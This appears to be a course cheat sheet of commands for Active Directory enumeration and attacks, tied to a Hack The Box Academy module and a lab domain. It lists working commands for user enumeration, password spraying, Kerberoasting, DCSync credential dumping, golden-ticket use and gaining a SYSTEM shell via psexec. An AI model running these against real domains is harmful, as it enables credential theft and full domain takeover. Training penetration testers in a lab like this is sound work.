...
| `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Runs the Kerbrute tool to discover usernames in the domain (`INLANEFREIGHT.LOCAL`) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc`using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host. [Initial Enumeration of the Domain - ACTIVE DIRECTORY ENUMERATION & ATTACKS](https://academy.hackthebox.com/module/143/section/1265) |
...
| `Get-DomainPolicy`                                           | Used to enumerate the password policy in a target Windows domain from a Windows-based host. Weak Password examples are `Password1` or `Welcome1`. [Enumerating & Retrieving Password Policies](https://academy.hackthebox.com/module/143/section/1490) |
...
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  \| grep sAMAccountName: \| cut -f2 -d" "` | Uses `ldapsearch` to discover users in a target Windows doman, then filters the output using `grep` to show only the `sAMAccountName` from a Linux-based host. [Password Spraying - Making a Target User List](https://academy.hackthebox.com/module/143/section/1455) |
...
| `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done` | Bash one-liner used to perform a password spraying attack using `rpcclient` and a list of users (`valid_users.txt`) from a Linux-based host. It also filters out failed attempts to make the output cleaner. [Internal Password Spraying - from Linux](https://academy.hackthebox.com/module/143/section/1271) |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1` | Uses `kerbrute` and a list of discovered users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host, using weak password of `Welcome1` or `Password1`. [Internal Password Spraying from a Linux Host - Using Kerbrute for the Attack](https://academy.hackthebox.com/module/143/section/1271) |
...
| `Get-DomainUser \| Select-Object samaccountname >all-ad-users.txt` | Using obtained credentials and authenticating to windows target, it is possible to import the module for `PowerView` on windows compromised host in powershell and obtain true list of all Active Directory Users. [Credentialed Enumeration - from Windows - PowerView is a tool written in PowerShell to help us gain situational awareness within an AD environment.](https://academy.hackthebox.com/module/143/section/1421)|
...
| `Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"` | PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host. [Kerberoasting - from Windows](https://academy.hackthebox.com/module/143/section/1423) |
...
| `Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat` | PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for `Hashcat` from a Windows-based host. [Kerberoasting - from Windows](https://academy.hackthebox.com/module/143/section/1423) |
...
| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-DomainUser -Identity adunn  \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl` | PowerView tool used to view the group membership of a specific user (`adunn`) in a target Windows domain. Performed from a Windows-based host. [DCSync Attack by user with DC Sync replication permissions ACL](https://academy.hackthebox.com/module/143/section/1489) |
...
| `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force` | Creates a variable (`$password`) set equal to the password (`Klmcargo2`) of a user from a Windows-based host. [Privileged Access - Establishing WinRM Session from Windows](https://academy.hackthebox.com/module/143/section/1275) |
...
| `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \| select SamAccountName` | PowerView tools used to enumerate users in a target child domain from a Windows-based host. Checking Users in the Child Domain using Get-DomainUser |
| `netdom query /domain:inlanefreight.local trust` | Using netdom to query domain trust |
| `netdom query /domain:inlanefreight.local dc` | Using netdom to query domain controllers |
| `netdom query /domain:inlanefreight.local workstation` | Using netdom to query workstations and servers |
...
| `Get-DomainSID`                                              | PowerView tool used to get the SID for a target child domain from a Windows-based host. We can use the PowerView Get-DomainSID function to get the SID for the child domain, but this is also visible in the Mimikatz. |
| `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid` | PowerView tool used to obtain the `Enterprise Admins` group's SID from a Windows-based host. Obtaining Enterprise Admins Group's SID using Get-DomainGroup |
...
| `get-content \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt` | With the Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session, we can read the flag on the remote Domain Controller C drive |
...
| `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt` | Impacket tool used to perform a DCSync attack from a Linux-based host. [Attacking Domain Trusts - Child -> Parent Trusts - from Linux](https://academy.hackthebox.com/module/143/section/1508) |
...
| `export KRB5CCNAME=hacker.ccache`                            | Used to set the `KRB5CCNAME Environment Variable` from a Linux-based host. The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials. Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts. |
| `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5` | Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host. Getting a SYSTEM shell using Impacket's psexec.py. The Quick reference site [WADCOMS](https://wadcoms.github.io/wadcoms/Impacket-PsExec/) providing a reference to `impacket-psexec`. |
